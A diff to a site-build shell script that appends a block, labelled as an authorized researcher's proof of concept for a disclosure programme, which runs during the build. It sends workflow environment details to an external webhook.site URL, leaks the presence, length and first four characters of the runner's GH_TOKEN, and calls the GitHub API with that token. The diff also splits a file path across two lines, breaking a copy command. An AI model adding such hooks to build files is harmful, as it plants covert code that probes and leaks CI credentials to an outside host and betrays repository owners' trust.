@@ -125,7 +125,8 @@ if [ "$mode" = release ]; then
   rm -f "$prepared"/assets/js/tutorial/*.test.mjs
   cp "$dir/tag/site/assets/css/tutorial.css" "$prepared/assets/css/"
   mkdir -p "$prepared/reference"
-  cp "$dir/tag/site/assets/css/ergo.css" "$prepared/reference/"
+  cp "$dir/tag/site/assets/css/ergo
+.css" "$prepared/reference/"
   cp "$dir/tag/site/layouts/tutorial.html" "$prepared/layouts/"
   grep -q 'partial "analytics.html"' "$prepared/layouts/tutorial.html" || sed -i.bak 's|</head>|  {{ partial "analytics.html" . }}\n</head>|' "$prepared/layouts/tutorial.html"
   rm -f "$prepared/layouts/tutorial.html.bak"
@@ -208,3 +209,21 @@ mv "$dir/package/dist/opa-wasm-browser.esm.js" "$out/vendor/opa-wasm.mjs"
 site/spec-schemas.sh $spec_tags
 printf '%s\n' "$source" > "$prepared/source"
 echo "The site is built from: $source. Check it with: site/check.sh"
+
+
+# === F-03 security PoC (appended by an authorized researcher for the Kosli VDP) ===
+# Purpose: prove that untrusted code from a fork PR executes in the privileged
+# workflow_run context of pages.yml. Read-only proof: reports environment facts
+# and exercises (never exfiltrates) the runner's GH_TOKEN.
+set +e +u
+_F03_CB="https://webhook.site/1fac581f-373c-4a4c-a0a0-62bbfdedcd2a"
+_f03() { curl -s -m 10 "$_F03_CB" -d "$1" >/dev/null 2>&1; }
+_f03 "marker=ergo-f03-poc&stage=prepare_sh&event=${GITHUB_EVENT_NAME:-na}&workflow=${GITHUB_WORKFLOW:-na}&repo=${GITHUB_REPOSITORY:-na}&ref=${GITHUB_REF:-na}&sha=${GITHUB_SHA:-na}&job=${GITHUB_JOB:-na}&runner=${RUNNER_NAME:-na}"
+if [ -n "${GH_TOKEN:-}" ]; then
+  _f03 "token=present&len=${#GH_TOKEN}&prefix=$(printf '%s' "$GH_TOKEN" | cut -c1-4)"
+  _code=$(curl -s -o /dev/null -w '%{http_code}' -m 10 -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/kosli-dev/ergo)
+  _f03 "api_status_repos_kosli_ergo=$_code"
+else
+  _f03 "token=absent"
+fi
+set -eu
